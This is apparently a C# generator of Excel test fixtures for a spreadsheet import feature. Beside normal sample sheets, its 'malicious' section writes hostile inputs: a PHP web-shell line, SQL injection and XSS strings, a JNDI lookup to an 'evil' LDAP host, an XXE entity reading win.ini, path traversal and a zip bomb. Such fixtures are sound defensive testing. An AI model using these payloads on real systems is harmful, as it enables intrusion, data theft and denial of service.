// Generator test Excel fajlova (COA-29 / T08). Bez spoljnih paketa: .xlsx se pise direktno (OpenXML preko ZipArchive).
// Pokretanje (iz korena repoa):
//   dotnet run tests/TestData/generator/generate.cs                 -> mali fajlovi + zlonamerni primeri
//   dotnet run tests/TestData/generator/generate.cs -- --large      -> dodatno veliki fajl (100.000 redova, gitignored)
//   dotnet run tests/TestData/generator/generate.cs -- --out <dir>   -> drugi izlazni direktorijum
// Generisanje je deterministicko (fiksan seed, fiksni timestamp-ovi u zip-u).

using System.IO.Compression;
using System.Text;
using System.Xml;

var largeToo = args.Contains("--large");
var outIdx = Array.IndexOf(args, "--out");
var root = outIdx >= 0 ? args[outIdx + 1] : Directory.Exists("tests/TestData") ? "tests/TestData/files" : "files";
var small = Path.Combine(root, "samples");
var bad = Path.Combine(root, "malicious");
var big = Path.Combine(root, "large");
Directory.CreateDirectory(small);
Directory.CreateDirectory(bad);

// ---------- 1. ispravan ----------
Xlsx.Write(Path.Combine(small, "01-valid.xlsx"), new Sheet("Zaposleni",
[
    ["Id", "Ime", "Prezime", "Email", "Plata", "DatumZaposlenja", "Aktivan"],
    .. Enumerable.Range(1, 20).Select(i => (object?[])[i, $"Ime{i}", $"Prezime{i}", $"korisnik{i}@example.com", 50000m + i * 1250.5m, new DateTime(2020, 1, 1).AddDays(i * 17), i % 3 != 0]),
]));

// ---------- 2. sa greskama (pogresni tipovi, duplikati, nevalidan email, van opsega) ----------
Xlsx.Write(Path.Combine(small, "02-with-errors.xlsx"), new Sheet("Podaci",
[
    ["Id", "Ime", "Email", "Plata", "DatumZaposlenja", "Aktivan"],
    [1, "Marko", "marko@example.com", 1000.50m, new DateTime(2021, 3, 4), true],
    [2, "Jelena", "nije-email", 2000m, new DateTime(2021, 3, 5), true],                 // los email
    ["tri", "Nikola", "nikola@example.com", 3000m, new DateTime(2021, 3, 6), false],    // tekst u broju
    [4, "Ivana", "ivana@example.com", "mnogo", new DateTime(2021, 3, 7), true],          // tekst u decimali
    [5, "Petar", "petar@example.com", 5000m, "32.13.2021", true],                         // nevalidan datum
    [5, "Duplikat", "petar@example.com", 5000m, new DateTime(2021, 3, 8), true],         // duplikat Id/Email
    [7, new string('x', 500), "dugacko@example.com", 7000m, new DateTime(2021, 3, 9), true], // predugacak tekst
    [8, "Negativan", "neg@example.com", -1m, new DateTime(2021, 3, 10), true],           // negativna vrednost
    [9, "Ogroman", "big@example.com", 1e30, new DateTime(2021, 3, 11), true],            // van opsega decimal
    [10, "Bool", "bool@example.com", 10m, new DateTime(2021, 3, 12), "mozda"],          // los boolean
    [2147483648d, "PreveliId", "int@example.com", 1m, new DateTime(2021, 3, 13), true], // van int opsega
]));

// ---------- 3. sa praznim celijama ----------
Xlsx.Write(Path.Combine(small, "03-empty-cells.xlsx"), new Sheet("Podaci",
[
    ["Id", "Ime", "Prezime", "Email", "Plata"],
    [1, "Marko", null, "marko@example.com", 1000m],
    [2, null, "Jovanovic", null, 2000m],
    [null, null, null, null, null],                  // potpuno prazan red usred podataka
    [4, "Ivana", "Horvat", "ivana@example.com", null],
    ["", "  ", "\t", "ws@example.com", 5m],          // prazni / whitespace stringovi
    [6, "Petar", "Petrovic", "petar@example.com", 6000m],
    [null, null, null, null, null],                  // prazni redovi na kraju
    [null, null, null, null, null],
]));

// ---------- 4. vise sheet-ova ----------
Xlsx.Write(Path.Combine(small, "04-multi-sheet.xlsx"),
    new Sheet("Gradovi", [["Naziv", "Drzava"], ["Beograd", "Srbija"], ["Zagreb", "Hrvatska"], ["Sarajevo", "BiH"]]),
    new Sheet("Kupci", [["Ime", "Prezime", "Email", "Grad"], ["Marko", "Markovic", "m@example.com", "Beograd"], ["Ivana", "Horvat", "i@example.com", "Zagreb"]]),
    new Sheet("Prazan", []),
    new Sheet("Proizvodi", [["Sifra", "Naziv", "Cena", "Zaliha"], ["P-100", "Olovka", 120m, 10], ["P-101", "Sveska", 350m, 20]]),
    new Sheet("Skriven", [["Tajna"], ["ne treba da se vidi"]], Hidden: true));

// ---------- 5. header nije u prvom redu ----------
Xlsx.Write(Path.Combine(small, "05-header-not-first-row.xlsx"), new Sheet("Izvestaj",
[
    ["Mesecni izvestaj prodaje"],
    ["Generisano: 2026-01-31"],
    [],
    ["Sifra", "Naziv", "Cena", "Zaliha"],            // header u 4. redu
    ["P-100", "Olovka", 120m, 10],
    ["P-101", "Sveska", 350m, 20],
    ["P-102", "Fascikla", 210.5m, 30],
    [],
    ["Ukupno", null, null, 60],                      // total red na kraju
]));

// ---------- 7. cirilica i specijalni karakteri ----------
Xlsx.Write(Path.Combine(small, "07-cyrillic-special.xlsx"), new Sheet("Подаци",
[
    ["Име", "Презиме", "Град", "Напомена"],
    ["Марко", "Марковић", "Београд", "ђчћжш ЂЧЋЖШ"],
    ["Јелена", "Јовановић", "Нови Сад", "Љубав и њушка"],
    ["Marko", "Đorđević", "Niš", "šđčćž ŠĐČĆŽ"],
    ["Emoji", "😀🎉", "Zürich", "日本語 العربية"],
    ["Zarez, tacka-zarez; navodnik \"", "Apostrof ' i &", "<tag> & </tag>", "Novi\nred i\ttab"],
    ["Vodeci razmak", "  trailing  ", "=1+1", "@SUM(A1)"],                // formula-injection tekst
    ["Nul\u0000bajt-zamena", "Kontrola\u0007", "0x1F", new string('ž', 300)],
]));

// ---------- zlonamerni primeri ----------
File.WriteAllBytes(Path.Combine(bad, "m01-xlsx-renamed-from-txt.xlsx"), Encoding.UTF8.GetBytes("Ovo je obican tekst, nije Excel.\nId,Ime\n1,Marko\n"));
File.WriteAllBytes(Path.Combine(bad, "m02-not-a-zip-png-header.xlsx"), [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, .. new byte[256]]);
File.WriteAllBytes(Path.Combine(bad, "m03-zip-magic-truncated.xlsx"), [0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00]); // pocetak ZIP-a, odsecen
File.WriteAllBytes(Path.Combine(bad, "m04-empty-0-bytes.xlsx"), []);
File.WriteAllText(Path.Combine(bad, "m05-script-disguised.xlsx"), "<script>alert(1)</script>\n<?php system($_GET['c']); ?>\n");
// ispravan xlsx sa pogresnom ekstenzijom
File.Copy(Path.Combine(small, "01-valid.xlsx"), Path.Combine(bad, "m06-valid-xlsx-wrong-extension.txt"), true);
File.Copy(Path.Combine(small, "01-valid.xlsx"), Path.Combine(bad, "m07-valid-xlsx-wrong-extension.exe"), true);
// zip bomba: ~100 MB nule u sheet XML-u, kompresuje se na ~100 KB (ispod limita upload-a, ali ogromna posle dekompresije)
Xlsx.WriteBomb(Path.Combine(bad, "m08-zip-bomb.xlsx"), 100L * 1024 * 1024);
// SQL injection u celijama i headerima
Xlsx.Write(Path.Combine(bad, "m09-sql-injection.xlsx"), new Sheet("Podaci",
[
    ["Id", "Ime'; DROP TABLE Kupci;--", "Email", "[Naziv] ]; DELETE FROM Gradovi;--"],
    [1, "'; DROP TABLE Kupci;--", "a@example.com", "' OR '1'='1"],
    [2, "Robert'); DROP TABLE Students;--", "b@example.com", "1; WAITFOR DELAY '0:0:10'--"],
    [3, "\" OR \"\"=\"", "c@example.com", "UNION SELECT name, password FROM sys.sql_logins--"],
    [4, "<script>alert('xss')</script>", "d@example.com", "<img src=x onerror=alert(1)>"],
    [5, "${jndi:ldap://evil/x}", "e@example.com", "{{7*7}}"],
    [6, "../../etc/passwd", "f@example.com", "..\\..\\windows\\win.ini"],
]));
// XXE u sheet XML-u (DTD sa spoljnim entitetom)
Xlsx.WriteRaw(Path.Combine(bad, "m10-xxe-doctype.xlsx"),
    sheetXml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]>"
              + "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>");
// vise redova/kolona nego sto je razumno za header (siroki header)
Xlsx.Write(Path.Combine(bad, "m11-wide-header-1000-columns.xlsx"), new Sheet("Siroko",
[
    [.. Enumerable.Range(1, 1000).Select(i => (object?)$"Kolona{i}")],
    [.. Enumerable.Range(1, 1000).Select(i => (object?)i)],
]));

// ---------- uskladjeno sa DemoDb semom (db/init/02-schema.sql) ----------
Xlsx.Write(Path.Combine(small, "08-demodb-gradovi.xlsx"), new Sheet("Gradovi",
[
    ["Naziv", "Drzava"],
    ["Kragujevac", "Srbija"], ["Subotica", "Srbija"], ["Ljubljana", "Slovenija"], ["Podgorica", "Crna Gora"],
]));
Xlsx.Write(Path.Combine(small, "09-demodb-kupci.xlsx"), new Sheet("Kupci",
[
    ["Ime", "Prezime", "Email", "Grad"],   // Grad -> Gradovi.Naziv (FK GradId), postojeci iz seed-a
    ["Milica", "Ilić", "milica.ilic@example.com", "Beograd"],
    ["Stefan", "Đurić", "stefan.djuric@example.com", "Novi Sad"],
    ["Ana", "Kovač", "ana.kovac@example.com", "Zagreb"],
    ["Luka", "Petrović", "luka.petrovic@example.com", "Niš"],
]));
Xlsx.Write(Path.Combine(small, "10-demodb-kupci-invalid.xlsx"), new Sheet("Kupci",
[
    ["Ime", "Prezime", "Email", "Grad"],
    ["Dobar", "Red", "dobar.red@example.com", "Beograd"],
    ["Nema", "Grada", "nema.grada@example.com", "Atlantida"],               // FK ne postoji
    ["Duplikat", "Seed", "marko.markovic@example.com", "Beograd"],          // email vec postoji u seed-u (UQ_Kupci_Email)
    ["Bez", "Emaila", null, "Beograd"],                                      // NOT NULL
    [null, "BezImena", "bez.imena@example.com", "Beograd"],                  // NOT NULL
    ["Dugo", new string('p', 101), "dugo@example.com", "Beograd"],          // > NVARCHAR(100)
]));
Xlsx.Write(Path.Combine(small, "11-demodb-proizvodi.xlsx"), new Sheet("Proizvodi",
[
    ["Sifra", "Naziv", "Cena", "Zaliha"],
    ["T-001", "Hemijska olovka", 99.9m, 1000],
    ["T-002", "Blok A5", 275m, 0],
    ["T-003", "Marker", 150.25m, null],                                      // Zaliha ima DEFAULT 0
    ["P-001", "Olovka (vec postoji)", 120m, 5],                              // duplikat Sifra iz seed-a
    ["T-005", "Prevelika cena", 12345678901234567890m, 1],                   // van DECIMAL(18,2)
]));

if (largeToo)
{
    Directory.CreateDirectory(big);
    Xlsx.WriteLarge(Path.Combine(big, "06-large-100k.xlsx"), 100_000);
}

Console.WriteLine($"Generisano u: {Path.GetFullPath(root)}{(largeToo ? " (ukljucujuci veliki fajl)" : "")}");

record Sheet(string Name, object?[][] Rows, bool Hidden = false);

static class Xlsx
{
    static readonly DateTimeOffset Fixed = new(2026, 1, 1, 0, 0, 0, TimeSpan.Zero);
    const string Ns = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";

    public static void Write(string path, params Sheet[] sheets)
    {
        using var fs = File.Create(path);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Create);
        var shared = new List<string>();
        var sharedIdx = new Dictionary<string, int>();
        for (var i = 0; i < sheets.Length; i++)
            Entry(zip, $"xl/worksheets/sheet{i + 1}.xml", w => SheetXml(w, sheets[i].Rows, shared, sharedIdx));
        Boilerplate(zip, sheets, shared);
    }

    public static void WriteLarge(string path, int rows)
    {
        using var fs = File.Create(path);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Create);
        var shared = new List<string>();
        var sharedIdx = new Dictionary<string, int>();
        var rnd = new Random(42);
        string[] gradovi = ["Beograd", "Novi Sad", "Niš", "Zagreb", "Kragujevac", "Subotica"];
        IEnumerable<object?[]> Gen()
        {
            yield return ["Id", "Ime", "Prezime", "Email", "Grad", "Iznos", "Datum", "Aktivan"];
            for (var i = 1; i <= rows; i++)
                yield return [i, $"Ime{i}", $"Prezime{i}", $"korisnik{i}@example.com", gradovi[rnd.Next(gradovi.Length)],
                    Math.Round((decimal)rnd.NextDouble() * 100000m, 2), new DateTime(2020, 1, 1).AddDays(rnd.Next(2000)), i % 2 == 0];
        }
        Entry(zip, "xl/worksheets/sheet1.xml", w => SheetXml(w, Gen(), shared, sharedIdx));
        Boilerplate(zip, [new Sheet("Podaci", [])], shared);
    }

    public static void WriteBomb(string path, long uncompressedBytes)
    {
        using var fs = File.Create(path);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Create);
        var e = zip.CreateEntry("xl/worksheets/sheet1.xml", CompressionLevel.SmallestSize);
        e.LastWriteTime = Fixed;
        using (var s = e.Open())
        {
            s.Write(Encoding.UTF8.GetBytes($"<?xml version=\"1.0\"?><worksheet xmlns=\"{Ns}\"><sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\"><is><t>"));
            var chunk = new byte[1024 * 1024]; Array.Fill(chunk, (byte)'A');
            for (long w = 0; w < uncompressedBytes; w += chunk.Length) s.Write(chunk);
            s.Write(Encoding.UTF8.GetBytes("</t></is></c></row></sheetData></worksheet>"));
        }
        Boilerplate(zip, [new Sheet("Podaci", [])], []);
    }

    public static void WriteRaw(string path, string sheetXml)
    {
        using var fs = File.Create(path);
        using var zip = new ZipArchive(fs, ZipArchiveMode.Create);
        Entry(zip, "xl/worksheets/sheet1.xml", w => w.Write(sheetXml));
        Boilerplate(zip, [new Sheet("Podaci", [])], []);
    }

    static void Boilerplate(ZipArchive zip, Sheet[] sheets, List<string> shared)
    {
        Entry(zip, "[Content_Types].xml", w =>
        {
            w.Write("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
                + "<Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/>"
                + "<Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>"
                + "<Override PartName=\"/xl/styles.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml\"/>"
                + "<Override PartName=\"/xl/sharedStrings.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml\"/>");
            for (var i = 1; i <= sheets.Length; i++)
                w.Write($"<Override PartName=\"/xl/worksheets/sheet{i}.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>");
            w.Write("</Types>");
        });
        Entry(zip, "_rels/.rels", w => w.Write("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>"));
        Entry(zip, "xl/workbook.xml", w =>
        {
            w.Write($"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><workbook xmlns=\"{Ns}\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><sheets>");
            for (var i = 0; i < sheets.Length; i++)
                w.Write($"<sheet name=\"{Esc(sheets[i].Name)}\" sheetId=\"{i + 1}\"{(sheets[i].Hidden ? " state=\"hidden\"" : "")} r:id=\"rId{i + 1}\"/>");
            w.Write("</sheets></workbook>");
        });
        Entry(zip, "xl/_rels/workbook.xml.rels", w =>
        {
            w.Write("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">");
            for (var i = 1; i <= sheets.Length; i++)
                w.Write($"<Relationship Id=\"rId{i}\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet{i}.xml\"/>");
            w.Write($"<Relationship Id=\"rId{sheets.Length + 1}\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/>");
            w.Write($"<Relationship Id=\"rId{sheets.Length + 2}\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings\" Target=\"sharedStrings.xml\"/>");
            w.Write("</Relationships>");
        });
        // stil 1 = datum (numFmt 14)
        Entry(zip, "xl/styles.xml", w => w.Write($"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><styleSheet xmlns=\"{Ns}\"><fonts count=\"1\"><font><sz val=\"11\"/><name val=\"Calibri\"/></font></fonts><fills count=\"2\"><fill><patternFill patternType=\"none\"/></fill><fill><patternFill patternType=\"gray125\"/></fill></fills><borders count=\"1\"><border><left/><right/><top/><bottom/><diagonal/></border></borders><cellStyleXfs count=\"1\"><xf numFmtId=\"0\" fontId=\"0\" fillId=\"0\" borderId=\"0\"/></cellStyleXfs><cellXfs count=\"2\"><xf numFmtId=\"0\" fontId=\"0\" fillId=\"0\" borderId=\"0\" xfId=\"0\"/><xf numFmtId=\"14\" fontId=\"0\" fillId=\"0\" borderId=\"0\" xfId=\"0\" applyNumberFormat=\"1\"/></cellXfs></styleSheet>"));
        Entry(zip, "xl/sharedStrings.xml", w =>
        {
            w.Write($"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><sst xmlns=\"{Ns}\" count=\"{shared.Count}\" uniqueCount=\"{shared.Count}\">");
            foreach (var s in shared) w.Write($"<si><t xml:space=\"preserve\">{Esc(s)}</t></si>");
            w.Write("</sst>");
        });
    }

    static void SheetXml(TextWriter w, IEnumerable<object?[]> rows, List<string> shared, Dictionary<string, int> idx)
    {
        w.Write($"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><worksheet xmlns=\"{Ns}\"><sheetData>");
        var r = 0;
        foreach (var row in rows)
        {
            r++;
            if (row.Length == 0) continue; // prazan red: samo preskoci redni broj
            w.Write($"<row r=\"{r}\">");
            for (var c = 0; c < row.Length; c++)
            {
                var v = row[c];
                if (v is null) continue;
                var cell = $"{Col(c)}{r}";
                switch (v)
                {
                    case string s:
                        if (!idx.TryGetValue(s, out var si)) { si = shared.Count; shared.Add(s); idx[s] = si; }
                        w.Write($"<c r=\"{cell}\" t=\"s\"><v>{si}</v></c>");
                        break;
                    case bool b: w.Write($"<c r=\"{cell}\" t=\"b\"><v>{(b ? 1 : 0)}</v></c>"); break;
                    case DateTime d: w.Write($"<c r=\"{cell}\" s=\"1\"><v>{d.ToOADate().ToString("R", System.Globalization.CultureInfo.InvariantCulture)}</v></c>"); break;
                    case IFormattable f: w.Write($"<c r=\"{cell}\"><v>{f.ToString(v is double or float ? "R" : null, System.Globalization.CultureInfo.InvariantCulture)}</v></c>"); break;
                    default: throw new NotSupportedException(v.GetType().Name);
                }
            }
            w.Write("</row>");
        }
        w.Write("</sheetData></worksheet>");
    }

    static string Col(int i) { var s = ""; for (i++; i > 0; i = (i - 1) / 26) s = (char)('A' + (i - 1) % 26) + s; return s; }

    static string Esc(string s)
    {
        var sb = new StringBuilder(s.Length);
        foreach (var ch in s)
        {
            if (ch == '&') sb.Append("&amp;");
            else if (ch == '<') sb.Append("&lt;");
            else if (ch == '>') sb.Append("&gt;");
            else if (ch == '"') sb.Append("&quot;");
            else if (XmlConvert.IsXmlChar(ch) || char.IsSurrogate(ch)) sb.Append(ch);
            // neispravni XML znakovi (npr. \0, \a) se izostavljaju
        }
        return sb.ToString();
    }

    static void Entry(ZipArchive zip, string name, Action<TextWriter> write)
    {
        var e = zip.CreateEntry(name, CompressionLevel.Optimal);
        e.LastWriteTime = Fixed;
        using var s = e.Open();
        using var w = new StreamWriter(s, new UTF8Encoding(false));
        write(w);
    }
}
